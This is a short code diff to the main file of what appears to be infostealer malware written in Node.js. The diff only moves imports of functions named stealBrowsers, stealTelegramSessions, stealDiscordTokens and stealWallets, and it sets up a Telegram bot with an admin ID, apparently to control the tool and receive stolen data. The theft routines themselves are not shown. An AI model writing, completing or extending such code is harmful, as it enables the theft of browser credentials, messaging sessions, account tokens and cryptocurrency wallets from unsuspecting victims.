@@ -1,10 +1,10 @@
 import "dotenv/config";
 import TelegramBot from "node-telegram-bot-api";
-import { getSystemInfo, getPublicIP } from "./modules/system.js";
-import { stealBrowsers } from "./modules/browsers.js";
-import { stealTelegramSessions } from "./modules/telegram.js";
-import { stealDiscordTokens } from "./modules/discord.js";
-import { stealWallets } from "./modules/wallets.js";
+import { getSystemInfo, getPublicIP } from "./system.js";
+import { stealBrowsers } from "./browsers.js";
+import { stealTelegramSessions } from "./telegram.js";
+import { stealDiscordTokens } from "./discord.js";
+import { stealWallets } from "./wallets.js";
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const ADMIN = String(process.env.ADMIN_ID);
